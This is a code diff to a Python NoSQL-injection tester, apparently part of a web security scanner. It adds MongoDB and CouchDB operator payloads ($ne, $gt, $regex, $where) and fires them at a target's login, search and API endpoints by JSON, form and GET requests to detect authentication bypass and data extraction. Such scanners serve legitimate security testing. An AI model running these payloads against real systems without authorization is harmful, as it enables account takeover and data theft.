@@ -34,28 +34,31 @@ def test_nosql_injection(
         Dict with test results
     """
     result = {
+        "type": "nosql_injection",
         "test": "nosql_injection",
         "vulnerable": False,
+        "url": target_url,  # Include URL for detection matching
+        "param": param,  # Include parameter name
         "db_type": None,
         "injection_method": None,
         "evidence": None
     }
     
-    # MongoDB injection payloads
+    # MongoDB injection payloads (as dicts, not strings)
     mongodb_payloads = [
         # Authentication bypass
-        ('{"$ne": null}', "mongodb_auth_bypass"),
-        ('{"$gt": ""}', "mongodb_auth_bypass_gt"),
-        ('{"$regex": ".*"}', "mongodb_regex"),
+        ({"$ne": None}, "mongodb_auth_bypass"),
+        ({"$gt": ""}, "mongodb_auth_bypass_gt"),
+        ({"$regex": ".*"}, "mongodb_regex"),
         # Boolean-based
-        ('{"$where": "this.username == this.password"}', "mongodb_where"),
+        ({"$where": "this.username == this.password"}, "mongodb_where"),
         # Time-based (if callback available)
     ]
     
     # CouchDB injection payloads
     couchdb_payloads = [
-        ('{"$ne": null}', "couchdb_auth_bypass"),
-        ('{"$gt": ""}', "couchdb_auth_bypass_gt"),
+        ({"$ne": None}, "couchdb_auth_bypass"),
+        ({"$gt": ""}, "couchdb_auth_bypass_gt"),
     ]
     
     # Determine payloads based on db_type
@@ -72,12 +75,16 @@ def test_nosql_injection(
     # Get original query params
     original_params = parse_qs(parsed.query)
     
+    # Success indicators for auth bypass
+    success_indicators = ["success", "welcome", "dashboard", "logged in", "authenticated", "login successful", "admin", "user profile", "role:"]
+    
     for payload, payload_name in payloads:
         try:
-            # Try as JSON in POST body
+            # Method 1: Try as JSON in POST body - payload is already a dict
+            # For single param test
             test_data = {param: payload}
             
-            # Try POST with JSON
+            # Try POST with JSON (single param injection)
             resp1 = requests.post(
                 base_url,
                 json=test_data,
@@ -87,67 +94,123 @@ def test_nosql_injection(
             
             # Check for authentication bypass indicators
             if resp1.status_code == 200:
-                # Check response for success indicators
                 response_lower = resp1.text.lower()
-                success_indicators = ["success", "welcome", "dashboard", "logged in", "authenticated"]
                 if any(ind in response_lower for ind in success_indicators):
                     result["vulnerable"] = True
                     result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                     result["injection_method"] = payload_name
                     result["evidence"] = {
-                        "payload": payload,
+                        "payload": json.dumps(test_data),
                         "method": "POST_JSON",
                         "status_code": resp1.status_code,
                         "response_snippet": resp1.text[:500],
-                        "note": "Authentication bypass detected"
+                        "note": "Authentication bypass detected (single param)"
                     }
-                    break
+                    return result
             
-            # Try POST with form data (URL-encoded)
+            # Method 2: For login endpoints, try injecting BOTH username and password
+            # This is the common MongoDB auth bypass pattern
+            if "login" in target_url.lower() or param == "username":
+                auth_bypass_data = {
+                    "username": payload,
+                    "password": payload
+                }
+                resp_auth = requests.post(
+                    base_url,
+                    json=auth_bypass_data,
+                    headers={"Content-Type": "application/json"},
+                    timeout=10
+                )
+                
+                if resp_auth.status_code == 200:
+                    response_lower = resp_auth.text.lower()
+                    if any(ind in response_lower for ind in success_indicators):
+                        result["vulnerable"] = True
+                        result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
+                        result["injection_method"] = payload_name
+                        result["evidence"] = {
+                            "payload": json.dumps(auth_bypass_data),
+                            "method": "POST_JSON_AUTH_BYPASS",
+                            "status_code": resp_auth.status_code,
+                            "response_snippet": resp_auth.text[:500],
+                            "note": "Authentication bypass detected (username+password injection)"
+                        }
+                        return result
+            
+            # Method 3: Try with query filter pattern (for search/api endpoints)
+            if "search" in target_url.lower() or "api" in target_url.lower():
+                query_data = {"query": {param: payload}}
+                resp_query = requests.post(
+                    base_url,
+                    json=query_data,
+                    headers={"Content-Type": "application/json"},
+                    timeout=10
+                )
+                
+                if resp_query.status_code == 200:
+                    try:
+                        json_resp = resp_query.json()
+                        # Check if we got results back (data extraction)
+                        if json_resp.get("results") or json_resp.get("users") or json_resp.get("count", 0) > 0:
+                            result["vulnerable"] = True
+                            result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
+                            result["injection_method"] = payload_name + "_data_extraction"
+                            result["evidence"] = {
+                                "payload": json.dumps(query_data),
+                                "method": "POST_JSON_QUERY",
+                                "status_code": resp_query.status_code,
+                                "response_snippet": resp_query.text[:500],
+                                "note": "NoSQL data extraction detected"
+                            }
+                            return result
+                    except:
+                        pass
+            
+            # Method 4: Try POST with form data (URL-encoded)
+            payload_str = json.dumps(payload)
             resp2 = requests.post(
                 base_url,
-                data={param: payload},
+                data={param: payload_str},
                 timeout=10
             )
             
             if resp2.status_code == 200:
                 response_lower = resp2.text.lower()
-                success_indicators = ["success", "welcome", "dashboard", "logged in"]
                 if any(ind in response_lower for ind in success_indicators):
                     result["vulnerable"] = True
                     result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                     result["injection_method"] = payload_name
                     result["evidence"] = {
-                        "payload": payload,
+                        "payload": payload_str,
                         "method": "POST_FORM",
                         "status_code": resp2.status_code,
                         "response_snippet": resp2.text[:500],
                         "note": "Authentication bypass detected"
                     }
-                    break
+                    return result
             
-            # Try GET with query parameter
+            # Method 5: Try GET with query parameter
+            payload_str = json.dumps(payload) if not isinstance(payload, str) else payload
             test_params = original_params.copy()
-            test_params[param] = [payload]
+            test_params[param] = [payload_str]
             test_url = base_url + "?" + urlencode(test_params, doseq=True)
             
             resp3 = requests.get(test_url, timeout=10)
             
             if resp3.status_code == 200:
                 response_lower = resp3.text.lower()
-                success_indicators = ["success", "welcome", "dashboard", "logged in"]
                 if any(ind in response_lower for ind in success_indicators):
                     result["vulnerable"] = True
                     result["db_type"] = "mongodb" if "mongodb" in payload_name else "couchdb"
                     result["injection_method"] = payload_name
                     result["evidence"] = {
-                        "payload": payload,
+                        "payload": payload_str,
                         "method": "GET",
                         "status_code": resp3.status_code,
                         "response_snippet": resp3.text[:500],
                         "note": "Authentication bypass detected"
                     }
-                    break
+                    return result
                     
         except Exception:
             continue
@@ -181,7 +244,10 @@ def test_nosql_injection_params(
     # Discover parameters if not provided
     if not params:
         from tools.rest_api_fuzzer import discover_parameters
-        params = discover_parameters(target_url)
+        discovered_params = discover_parameters(target_url)
+        # Always include common NoSQL injection parameter names
+        nosql_params = ["username", "user", "email", "password", "query", "search", "filter", "id", "user_id"]
+        params = list(set(discovered_params + nosql_params))
     
     # Test each parameter
     for param in params:
